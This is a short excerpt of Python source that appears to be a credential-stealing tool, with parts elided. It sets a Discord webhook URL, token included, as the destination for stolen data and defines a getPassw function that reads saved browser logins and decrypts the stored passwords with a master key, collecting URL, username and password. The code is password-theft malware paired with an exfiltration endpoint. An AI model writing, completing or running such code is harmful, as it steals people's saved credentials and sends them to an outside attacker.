...
hook = "https://discord.com/api/webhooks/1042939060563496970/84SZAX_Loaau8tWTf9fiekD08sN8w16FEbmX7FdHBDowsRCfNKt_4iSgTA2d8hlebRKL"
DETECTED = False
...
def getPassw(path, arg):
    ...
    for row in data:
        if row[0] != '':
            ...
            Passw.append(f"UR1: {row[0]} | USER: {row[1]} | PASSWORD: {DecryptValue(row[2], master_key)}")
